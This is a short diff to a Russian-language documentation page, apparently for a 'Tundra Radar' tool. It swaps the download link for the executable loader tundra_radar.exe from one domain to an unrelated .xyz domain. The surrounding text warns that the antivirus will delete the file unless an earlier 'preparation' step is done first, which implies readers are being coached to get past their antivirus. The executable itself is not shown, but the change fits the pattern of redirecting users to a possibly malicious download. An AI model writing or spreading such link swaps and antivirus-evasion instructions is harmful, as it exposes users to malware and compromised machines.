@@ -59,7 +59,7 @@ icon: circle-chevron-right
 
 Прямая ссылка на актуальный лоадер:
 
-* [tndr-panel.online/loader/tundra\_radar.exe](https://tndr-panel.online/loader/tundra_radar.exe)
+* [https://www.sututusu.xyz/loader/tundra\_radar.exe](https://www.sututusu.xyz/loader/tundra_radar.exe)
 
 **Важно:** сначала выполните подготовку выше и только потом скачивайте файл — иначе антивирус удалит его на этапе загрузки, и вы получите пустую папку.
 
